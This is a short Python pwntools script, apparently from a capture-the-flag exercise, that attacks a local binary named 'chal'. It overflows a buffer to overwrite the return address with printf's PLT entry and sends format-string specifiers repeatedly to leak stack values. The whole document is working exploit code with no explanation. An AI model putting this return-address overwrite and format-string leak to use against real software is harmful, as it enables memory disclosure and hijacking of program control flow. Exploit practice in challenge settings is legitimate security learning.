from pwn import *
context.arch='amd64'; context.log_level='error'
e=ELF("./chal")
PRINTF=e.plt['printf']; MAIN=e.symbols['main']
def build(fmt, ret):
    body=(b"exit"+fmt).ljust(0x58,b"A")
    assert b"\x00" not in body
    return body+p64(ret)

p=process("./chal")
# Can we loop printf directly (return to PRINTF each round)?
for i in range(4):
    p.recvuntil(b">> ")
    p.send(build(b"R%d:%%6$p.%%7$p.%%8$p.%%9$p.%%10$p.%%11$p.%%12$p.%%13$p.%%14$p."%i, PRINTF))
    import time; time.sleep(0.2)
    try:
        d=p.recv(timeout=2)
        print("PRINTF round",i,":",d[:220])
    except Exception as ex:
        print("round",i,"no recv / dead:",ex); break
p.close()
